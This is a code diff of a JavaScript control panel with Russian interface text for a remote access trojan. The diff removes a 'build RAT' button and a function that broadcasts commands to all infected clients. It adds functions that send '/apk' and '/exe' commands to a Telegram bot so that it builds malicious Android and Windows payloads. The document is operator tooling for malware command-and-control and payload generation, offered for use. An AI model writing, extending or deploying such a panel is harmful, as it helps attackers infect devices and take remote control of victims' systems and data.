@@ -185,8 +185,8 @@
             </select>
         </div>
         <div class="build-actions">
-            <button class="btn btn-primary" onclick="buildRAT()">📦 Собрать RAT</button>
-            <button class="btn btn-success" onclick="sendToAll()">📨 Всем</button>
+            <button class="btn btn-primary" onclick="buildAPK()">📦 APK</button>
+            <button class="btn btn-success" onclick="buildEXE()">📦 EXE</button>
         </div>
         <div id="buildStatus" style="margin-top:8px;color:#ffaa00;font-size:13px;display:none;">⏳ Сборка...</div>
     </div>
@@ -304,15 +304,14 @@ function sendCustom() {
 }
 
 // ==========================================
-// БИЛДЕР
-// ==========================================
-async function buildRAT() {
+// БИЛДЕР APK// ==========================================
+async function buildAPK() {
     const status = document.getElementById('buildStatus');
     status.style.display = 'block';
-    status.textContent = '⏳ Сборка...';
+    status.textContent = '⏳ Сборка APK...';
     status.style.color = '#ffaa00';
     
-    log('📦 Сборка RAT...', 'cmd');
+    log('📦 Сборка APK...', 'cmd');
     
     try {
         const resp = await fetch(`${API}/sendMessage`, {
@@ -320,16 +319,15 @@ async function buildRAT() {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: "-1",
-                text: "/build",
-                parse_mode: "HTML"
+                text: "/apk"
             })
         });
         const data = await resp.json();
         
         if (data.ok) {
-            status.textContent = '✅ Запрос отправлен! Жди файл в Telegram';
+            status.textContent = '✅ APK собирается! Жди файл в Telegram';
             status.style.color = '#00ff88';
-            log('✅ Запрос на сборку отправлен!', 'result');
+            log('✅ Запрос на APK отправлен!', 'result');
         } else {
             status.textContent = `❌ ${data.description}`;
             status.style.color = '#ff4466';
@@ -342,21 +340,40 @@ async function buildRAT() {
     }
 }
 
-async function sendToAll() {
-    const command = document.getElementById('buildCommand').value;
-    log(`📨 Отправка ${command} всем`, 'cmd');
+// ==========================================
+// БИЛДЕР EXE
+// ==========================================
+async function buildEXE() {
+    const status = document.getElementById('buildStatus');
+    status.style.display = 'block';
+    status.textContent = '⏳ Сборка EXE...';
+    status.style.color = '#ffaa00';
+    
+    log('📦 Сборка EXE...', 'cmd');
     
     try {
-        await fetch(`${API}/sendMessage`, {
+        const resp = await fetch(`${API}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: "-1",
-                text: `/broadcast ${command}`
+                text: "/exe"
             })
         });
-        log(`✅ Команда отправлена всем`, 'result');
+        const data = await resp.json();
+        
+        if (data.ok) {
+            status.textContent = '✅ EXE готов! Жди файл в Telegram';
+            status.style.color = '#00ff88';
+            log('✅ Запрос на EXE отправлен!', 'result');
+        } else {
+            status.textContent = `❌ ${data.description}`;
+            status.style.color = '#ff4466';
+            log(`❌ ${data.description}`, 'error');
+        }
     } catch(e) {
+        status.textContent = `❌ ${e.message}`;
+        status.style.color = '#ff4466';
         log(`❌ ${e.message}`, 'error');
     }
 }
